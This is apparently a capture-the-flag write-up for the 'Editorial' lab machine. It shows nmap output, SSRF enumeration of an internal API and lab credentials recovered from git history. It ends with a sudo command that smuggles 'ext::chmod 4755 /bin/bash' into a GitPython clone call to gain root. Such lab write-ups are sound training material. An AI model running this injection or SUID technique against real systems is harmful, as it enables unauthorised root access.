#windows #file-upload

# NMAP 
```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-06 21:23 CDT
Warning: 10.129.201.125 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.129.201.125
Host is up (0.077s latency).
Not shown: 65193 closed tcp ports (reset), 340 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.16 seconds

```


> /uploads has a form that potentially could enumerate the machine through ssrf 
>
> tried a [payload](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-Jhaddix.txt)  for lfi enumeration 
> 
> also enumerated internal port using burpsuite, found port 5000 and endpoints on the port, 

```shell
{"messages":[{"promotions":{"description":"Retrieve a list of all the promotions in our library.","endpoint":"/api/latest/metadata/messages/promos","methods":"GET"}},{"coupons":{"description":"Retrieve the list of coupons to use in our library.","endpoint":"/api/latest/metadata/messages/coupons","methods":"GET"}},{"new_authors":{"description":"Retrieve the welcome message sended to our new authors.","endpoint":"/api/latest/metadata/messages/authors","methods":"GET"}},{"platform_use":{"description":"Retrieve examples of how to use the platform.","endpoint":"/api/latest/metadata/messages/how_to_use_platform","methods":"GET"}}],"version":[{"changelog":{"description":"Retrieve a list of all the versions and updates of the api.","endpoint":"/api/latest/metadata/changelog","methods":"GET"}},{"latest":{"description":"Retrieve the last version of api.","endpoint":"/api/latest/metadata","methods":"GET"}}]}

```
> 
> found credentials 
```shell
Username: dev\nPassword: dev080217_devAPI!@
```
## Post exploitation
>uses git version control, found a version using `git log`, it contains `prod` user credentials
>

```shell
prod\nPassword: 080217_Producti0n_2023!@
```

> has root privileges on a specific python file
```shell
 (root) /usr/bin/python3
        /opt/internal_apps/clone_changes/clone_prod_change.py *

```

> the python file uses a [vulnerable](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858)  function (clone_from) from git Library on where it can trigger RCE, used it to change /bin/bash to an SUID file
> 
```bash
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::chmod 4755 /bin/bash'

```

```shell
/bin/bash -p
```

> gained root access